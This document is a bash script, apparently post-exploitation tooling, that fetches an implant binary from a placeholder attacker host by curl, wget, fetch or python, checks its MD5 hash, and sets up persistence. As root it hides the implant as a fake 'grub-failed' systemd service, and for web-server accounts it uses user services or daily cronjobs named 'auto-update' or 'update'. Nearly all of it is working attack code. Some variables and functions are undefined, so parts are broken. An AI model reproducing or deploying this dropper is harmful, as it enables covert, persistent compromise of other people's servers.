#!/bin/bash

download() {
    url="$1"
    out="$2"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "$url" -o "$out" && return 0
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -qO "$out" "$url" && return 0
    fi

    if command -v fetch >/dev/null 2>&1; then
        fetch -o "$out" "$url" && return 0
    fi

    if command -v python3 >/dev/null 2>&1; then
        python3 - <<EOF
import urllib.request
urllib.request.urlretrieve("$url", "$out")
EOF
        return $?
    fi

    echo "[!]-----| Can't download binary.." >&2
    return 1
}

get_home() {
    local user="${1:-$USER}"

    awk -F: -v user="$user" '
        $1 == user {
            print $6
            exit
        }
    ' /etc/passwd
}

download_and_verify() {
    url="$1"
    out="$2"
    expected="$3"

    download "$url" "$out" || return 1

    [ -f "$out" ] || return 1

    read -r hash _ < <(md5sum "$out")

    [ "$hash" = "$expected" ]
}

USER=$(id -un)
HOME=$(get_home "$USER")

url="http://<HOST>:<PORT>/<IMPLANT>"
out="/tmp/<MD5_HASH>"
expected="<MD5_HASH>"

if download_and_verify "$url" "$out" "$expected"; then
    echo "[+]-----| Binary successfully downloaded!"
    echo "[i]-----| Setting up binary.."
    chmod +x "/tmp/<IMPLANT>"

    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
        echo "[i]-----| Setting up global systemd service.."
        mv "/tmp/<IMPLANT>" /usr/bin/grub-failed
        cat > "$service_file" <<EOF
[Unit]
Description=Grub failed boot detection
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/grub-failed
Restart=always

[Install]
WantedBy=default.target
EOF

        systemctl daemon-reload 2>/dev/null
        systemctl enable "grub-failed" 2>/dev/null
        systemctl start "grub-failed" 2>/dev/null &

        sleep 2
        p=$(systemctl is-active "grub-failed" 2>/dev/null)
        if [[ "$p" == "active" || "$p" == "activating" ]]; then
            systemctl restart "grub-failed" &
            echo "[+]-----| Binary persistence established!"
            echo "[i]-----| Check systemd: $ systemctl --no-pager status grub-failed"
        else
            echo "[!]-----| Failed to established persistence.."
        fi
        echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
    fi

    if [ "$b" -eq 0 ] && [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
        echo "[i]-----| Setting up local(user) systemd service.."

        service_dir="$HOME/.config/systemd/user"
        service_file="$service_dir/grub-failed.service"
        implant="$service_dir/grub-failed"
        mkdir -p "$service_dir"
        mv "/tmp/<IMPLANT>" "$service_dir/grub-failed"

        cat > "$service_file" <<EOF
[Unit]
Description=Grub failed boot detection
After=network.target

[Service]
Type=simple
ExecStart=$service_dir/grub-failed
Restart=always

[Install]
WantedBy=default.target
EOF

        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "grub-failed" 2>/dev/null
        systemctl --user start "grub-failed" 2>/dev/null

        sleep 2
        p=$(systemctl --user is-active "grub-failed" 2>/dev/null)
        if [[ "$p" == "active" || "$p" == "activating" ]]; then
            systemctl --user restart "grub-failed" &
            echo "[+]-----| Binary persistence established!"
            echo "[i]-----| Check systemd: $ systemctl --no-pager --user status grub-failed"
        else
            echo "[!]-----| Failed to established persistence.."
            echo "[i]-----| Setting up cronjob for persistence.."

            mkdir -p "$HOME/.config/tasks"
            mv "$implant" "$HOME/.config/tasks/auto-update"
            persist="@daily $HOME/.config/tasks/auto-update"

            if command -v crontab >/dev/null 2>&1; then
                (crontab -l 2>/dev/null; echo "$persist") | crontab -
                last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
                if [ "$last_line" = "$persist" ]; then
                    success "[+]-----| Cronjob successfully created!"
                    success "[i]-----| Persistence established.."
                else
                    echo "[!]-----| Failed to add cronjob.."
                fi
            else
                echo "[!]-----| Failed to add cronjob.."
            fi
            echo "[i]-----| Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
            nohup ~/.config/tasks/auto-update &>/dev/null & disown
        fi
    fi

    if [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
        echo "[i]-----| Setting up cronjob for persistence.."
        if [ -d /var/tmp ] && [ -w /var/tmp ]; then
            tasks="/var/tmp"
        else
            tasks="/tmp"
        fi

        binary="$tasks/update"

        mkdir -p $tasks
        mv "/tmp/<IMPLANT>" $binary

        nohup $binary &>/dev/null & disown

        persist="@daily $binary"

        if command -v crontab >/dev/null 2>&1; then
            (crontab -l 2>/dev/null; echo "$persist") | crontab -
            last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
            if [ "$last_line" = "$persist" ]; then
                success "[+]-----| Cronjob successfully created!"
                success "[i]-----| Persistence established.."
            else
                echo "[!]-----| Failed to add cronjob.."
            fi
        else
            echo "[!]-----| Failed to add cronjob.."
        fi
        echo "[i]-----| Run the binary: $ nohup $binary &>/dev/null & disown"
        nohup $binary &>/dev/null & disown
    fi
else
    echo "[!]-----| Failed downloading binary!"
    echo "[!]-----| Canceling persistence installment..."
fi
